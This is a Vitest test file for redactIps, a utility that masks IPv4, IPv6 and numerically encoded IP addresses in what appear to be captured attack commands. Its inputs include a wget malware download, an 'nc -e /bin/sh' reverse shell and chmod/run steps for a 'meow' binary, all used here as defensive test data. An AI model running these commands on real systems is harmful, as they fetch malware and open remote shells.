import { describe, expect, it } from 'vitest'

import { IP_BLOT, redactIps } from '@/utils/redactIps'

describe('redactIps', () => {
  it('masks an IPv4 literal inside a command', () => {
    const r = redactIps('wget http://34.11.136.102/meow')
    expect(r.count).toBe(1)
    expect(r.text).toBe('wget http://<ip>/meow')
    expect(r.text).not.toContain('34.11.136.102')
  })

  it('masks IPv6 literals (full and compressed)', () => {
    expect(redactIps('ping 2001:db8::1').count).toBe(1)
    expect(redactIps('a 2001:0db8:0000:0000:0000:ff00:0042:8329 b').count).toBe(1)
    expect(redactIps('host ::1 ok').count).toBe(1)
  })

  it('masks IPv4-in-IPv6 embedded forms with no cleartext octet tail', () => {
    for (const s of [
      'route 2001:db8::1.2.3.4 via',
      'curl http://[64:ff9b::1.2.3.4]/x',
      'host ::ffff:1.2.3.4 reached',
      'a ::1.2.3.4 b',
    ]) {
      const r = redactIps(s)
      expect(r.count).toBeGreaterThanOrEqual(1)
      // No surviving dotted-quad fragments (e.g. "<ip>.2.3.4") that reveal octet positions.
      expect(r.text).not.toMatch(/\d+\.\d+\.\d+/)
    }
  })

  it('masks bracketed and userinfo-embedded IPv6 URL hosts', () => {
    expect(redactIps('wget http://[2001:db8::1]/x').text).not.toContain('2001:db8')
    expect(redactIps('ssh user@2001:db8::1').text).not.toContain('2001:db8')
  })

  it('masks alternate-encoding numeric URL hosts, keeping the scheme', () => {
    expect(redactIps('wget http://2130706433/x').text).toBe('wget http://<ip>/x')
    expect(redactIps('curl http://0x7f000001/p').text).toBe('curl http://<ip>/p')
    expect(redactIps('get http://0177.0.0.1/').text).toBe('get http://<ip>/')
  })

  it('masks schemeless numeric-encoded hosts dropped after the shell command', () => {
    const r = redactIps('nc -e /bin/sh 2130706433 4444')
    expect(r.text).toBe('nc -e /bin/sh <ip> 4444')
    expect(r.count).toBe(1)
    expect(redactIps('nc 0x7f000001 4444').text).toBe('nc <ip> 4444')
    expect(redactIps('curl ftp://2130706433/x').text).toBe('curl ftp://<ip>/x')
  })

  it('does NOT mask ordinary shell numbers as schemeless IP hosts', () => {
    for (const s of ['chmod 777 x', 'sleep 30', 'dd bs=1024', 'id=12345']) {
      const r = redactIps(s)
      expect(r.count).toBe(0)
      expect(r.text).toBe(s)
    }
    // 10-digit but above the valid IPv4-as-integer range (> 4294967295): not an IP.
    expect(redactIps('echo 9999999999').count).toBe(0)
  })

  it('does NOT over-mask a 5+ segment dotted version string', () => {
    const r = redactIps('lib.so.1.2.3.4.5')
    expect(r.count).toBe(0)
    expect(r.text).toBe('lib.so.1.2.3.4.5')
  })

  it('does NOT mask non-IP tokens', () => {
    const negatives = [
      'chmod 777 meow',
      './meowarm64',
      '13:41:49',
      'SSH-2.0-Go',
      '8da193366e1554c08b2870c50f737b9587c3372b656151c4a96028af26f51334',
    ]
    for (const s of negatives) {
      const r = redactIps(s)
      expect(r.count).toBe(0)
      expect(r.text).toBe(s)
    }
  })

  it('returns segments that reassemble to the redacted text', () => {
    const r = redactIps('a 1.2.3.4 b 5.6.7.8 c')
    expect(r.count).toBe(2)
    expect(r.segments.map((s) => s.text).join('')).toBe(r.text)
    expect(r.segments.filter((s) => s.redacted)).toHaveLength(2)
  })

  it('honors a custom token', () => {
    expect(redactIps('x 1.2.3.4', '[redacted]').text).toBe('x [redacted]')
  })

  it('leaves plain text untouched', () => {
    const r = redactIps('whoami')
    expect(r.count).toBe(0)
    expect(r.segments).toEqual([{ text: 'whoami', redacted: false }])
    expect(IP_BLOT).toBe('<ip>')
  })
})

describe('parity with the backend redact.py', () => {
  it('blots an address wrapped in underscores', () => {
    // \b never fires against `_`, so this banner shape must be handled specially.
    expect(redactIps('MGLNDD_204.168.164.170_22').text).toBe('MGLNDD_<ip>_22')
  })

  it('does not over-blot version-like strings after widening the boundary', () => {
    expect(redactIps('lib.so.1.2.3.4.5').text).toBe('lib.so.1.2.3.4.5')
    expect(redactIps('abc1.2.3.4').text).toBe('abc1.2.3.4')
    expect(redactIps('1.2.3.4abc').text).toBe('1.2.3.4abc')
    expect(redactIps('1.2.3.4.arm7').text).toBe('<ip>.arm7')
  })

  it('leaves ordinary numbers alone when numericHosts is off', () => {
    const cred = (s: string) => redactIps(s, undefined, { numericHosts: false }).text
    expect(cred('123456789')).toBe('123456789')
    expect(cred('Admin@123456789')).toBe('Admin@123456789')
    // Real literals still blot with the flag off.
    expect(cred('204.168.164.170')).toBe('<ip>')
    expect(cred('connect 2001:db8::1')).toBe('connect <ip>')
  })

  it('keeps the shell-command default blotting integer-encoded hosts', () => {
    expect(redactIps('nc -e /bin/sh 2130706433 4444').text).toBe('nc -e /bin/sh <ip> 4444')
  })

  it('uses the same blot token as the API', () => {
    // IP_BLOT must match redact.py exactly so backend and frontend blots stay consistent.
    expect(IP_BLOT).toBe('<ip>')
  })
})
